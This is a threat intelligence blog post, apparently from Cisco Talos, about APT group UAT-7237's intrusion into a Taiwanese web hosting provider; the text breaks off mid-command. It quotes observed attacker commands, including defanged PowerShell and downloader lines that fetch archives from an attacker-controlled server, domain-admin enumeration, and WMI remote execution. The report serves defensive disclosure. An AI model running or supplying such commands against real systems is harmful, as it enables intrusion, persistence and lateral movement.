---
title: UAT-7237 targets Taiwanese web hosting infrastructure
url: https://blog.talosintelligence.com/uat-7237-targets-web-hosting-infra/
source: Over Security - Cybersecurity news aggregator
date: 2025-08-16
fetch_date: 2025-10-07T00:49:11.954240
---

# UAT-7237 targets Taiwanese web hosting infrastructure

# Cisco Talos Blog

[ ]

* [Intelligence Center](https://talosintelligence.com/reputation)

  [ ]

  + [# Intelligence Center](https://talosintelligence.com/reputation)
  + BACK
  + [Intelligence Search](https://talosintelligence.com/reputation_center)
  + [Email & Spam Trends](https://talosintelligence.com/reputation_center/email_rep)
* [Vulnerability Research](https://talosintelligence.com/vulnerability_info)

  [ ]

  + [# Vulnerability Research](https://talosintelligence.com/vulnerability_info)
  + BACK
  + [Vulnerability Reports](https://talosintelligence.com/vulnerability_reports)
  + [Microsoft Advisories](https://talosintelligence.com/ms_advisories)
* [Incident Response](https://talosintelligence.com/incident_response)

  [ ]

  + [# Incident Response](/incident_response)
  + BACK
  + [Reactive Services](https://talosintelligence.com/incident_response/services#reactive-services)
  + [Proactive Services](https://talosintelligence.com/incident_response/services#proactive-services)
  + [Emergency Support](https://talosintelligence.com/incident_response/contact)
* [Blog](https://blog.talosintelligence.com)
* [Support](https://support.talosintelligence.com)

More

* Security Resources

  [ ]

  # Security Resources

  + BACK

  Security Resources
  + [Open Source Security Tools](https://talosintelligence.com/software)
  + [Intelligence Categories Reference](https://talosintelligence.com/categories)
  + [Secure Endpoint Naming Reference](https://talosintelligence.com/secure-endpoint-naming)
* Media

  [ ]

  # Media

  + BACK

  Media
  + [Talos Intelligence Blog](https://blog.talosintelligence.com)
  + [Threat Source Newsletter](https://blog.talosintelligence.com/category/threat-source-newsletter/)
  + [Beers with Talos Podcast](https://talosintelligence.com/podcasts/shows/beers_with_talos)
  + [Talos Takes Podcast](https://talosintelligence.com/podcasts/shows/talos_takes)
  + [Talos Videos](https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured)
* Company

  [ ]

  # Company

  + BACK

  Company
  + [About Talos](https://talosintelligence.com/about)
  + [Careers](https://talosintelligence.com/careers)

![](/content/images/2025/08/UAT-5918-header.jpg)

# UAT-7237 targets Taiwanese web hosting infrastructure

By
[Asheer Malhotra](https://blog.talosintelligence.com/author/asheer-malhotra/),
[Brandon White](https://blog.talosintelligence.com/author/brandon/),
[Vitor Ventura](https://blog.talosintelligence.com/author/vitor-ventura/)

Friday, August 15, 2025 06:00

[APT](/category/apt/)
[malware](/category/malware/)

* Cisco Talos discovered UAT-7237, a Chinese-speaking advanced persistent threat (APT) group active since at least 2022, which has significant overlaps with UAT-5918.
* UAT-7237 conducted a recent intrusion targeting web infrastructure entities within Taiwan and relies heavily on the use of open-sourced tooling, customized to a certain degree, likely to evade detection and conduct malicious activities within the compromised enterprise.
* UAT-7237 aims to establish long-term persistence in high-value victim environments.
* Talos also identified a customized Shellcode loader in UAT-7237's arsenal that we track as “SoundBill.” SoundBill can be used to decode and load any shellcode, including Cobalt Strike.

---

Talos assesses with high confidence that UAT-7237 is a Chinese-speaking APT group, focusing heavily on establishing long-term persistence in web infrastructure entities in Taiwan. Most of UAT-7237's tooling consists of open-sourced tools, customized to a certain extent, including the use of a customized Shellcode loader we track as “SoundBill.”

Talos further assesses that UAT-7237 is likely a subgroup of UAT-5918, operating under the same umbrella of threat actors. UAT-7237's tooling, victimology and dates of activity overlap significantly with [UAT-5918.](https://blog.talosintelligence.com/uat-5918-targets-critical-infra-in-taiwan/) Additionally, both threat groups develop, customize and operate tooling using the Chinese language as their preliminary language of choice.

While Talos assesses that UAT-7237 is a subgroup of UAT-5918, there are some deviations in UAT-7237's tactics, techniques and procedures (TTPs) that necessitate its designation as a distinct threat actor:

* UAT-7237 primarily relies on the use of Cobalt Strike as its staple backdoor implant while UAT-5918 relies primarily on Meterpreter based reverse shells.
* After a successful compromise, UAT-5918 typically deploys a flurry of web shells. However, UAT-7237's deployment of web shells is highly selective and only on a chosen few compromised endpoints.
* While UAT-5918 relies on web shells as their primary channel of backdoor access, UAT-7237 relies on a combination of direct remote desktop protocol (RDP) access and SoftEther VPN clients to achieve the same.

In a recent intrusion, UAT-7237 compromised, infiltrated and established long term persistence in a Taiwanese web hosting provider. It is worth noting that the threat actor had a particular interest in gaining access to the victim organization’s VPN and cloud infrastructure. UAT-7237 used open-source and customized tooling to perform several malicious operations in the enterprise, including reconnaissance, credential extraction, deploying bespoke malware, setting up backdoored access via VPN clients, network scanning and proliferation.

## Initial access and reconnaissance

UAT-7237 gains initial access by exploiting known vulnerabilities on unpatched servers exposed to the internet. Once the target has been successfully compromised, UAT-7237, like any other stealth-oriented APT, conducts rapid fingerprinting to evaluate if the target is worth conducting further malicious actions on.

Reconnaissance consists of identifying remote hosts, both internal and on the internet:

```
cmd /c nslookup <victim’s_domain>
cmd /c systeminfo
cmd /c curl
cmd /c ping 8[.]8[.]8[.]8
cmd /c ping 141[.]164[.]50[.]141          // Attacker controlled remote server.
cmd /c ping <victim’s_domain>
cmd /c ipconfig /all
```

While UAT-5918 immediately begins deploying web shells to establish backdoored channels of access, UAT-7237 deviates significantly, using the SoftEther VPN client (similar to Flax Typhoon) to persist their access, and later access the systems via RDP:

```
cmd /c c:\temp\WM7Lite\download[.]exe  hxxp[://]141[.]164[.]50[.]141/sdksdk608/win-x64[.]rar c:\temp\WM7Lite\1[.]rar

powershell (new-object System[.]Net[.]WebClient).DownloadFile('hxxp[://]141[.]164[.]50[.]141/sdksdk608/vpn[.]rar','C:\Windows\Temp\vmware-SYSTEM\vmtools[.]rar')
```

Once UAT-7237 sets up initial access, reconnaissance and VPN-based access, they start preparing to pivot to additional systems in the enterprise to proliferate and conduct malicious activities:

```
cmd[.]exe /c cd /d "<remote_smb_share>"&net use
cmd[.]exe /c cd /d "<remote_smb_share>"&dir \\<remote_smb_share>\c$\
cmd[.]exe /c cd /d "C:\"&net group "domain admins" /domain
cmd[.]exe /c cd /d "C:\"&net group "domain controllers" /domain
```

In addition to relying on living-off-the-land binaries (LOLBins), UAT-7237 actively employed Windows Management Instrumentation (WMI) based tooling during reconnaissance and proliferation such as [SharpWMI](https://github.com/GhostPack/SharpWMI) and [WMICmd](https://github.com/nccgroup/WMIcmd):

```
cmd[.]exe /c cd /d "C:\"&C:\ProgramData\dynatrace\sharpwmi[.]exe <IP> <user> <pass> cmd whoami

cmd.exe /c cd /d "C:\DotNet\"&WMIcmd.exe

wmic /node:<IP> /user:Administrator /password:<pass> process call create cmd.exe /c whoami

wmic /node:<IP> /user:Administrator /password:<pass> process call create cmd.exe /c netstat -ano >c:\1.txt
```

 SharpWMI and WMICmd can both be used to execute WMI queries on remote hosts, and they allow for arbitrary command and code executions.

UAT-7237 fingerprinted any systems subsequently accessed using rudimentary window commands such as:

```
cmd.exe /c systeminfo
cmd.exe /c tasklist
cmd.exe /c net1 user /doma...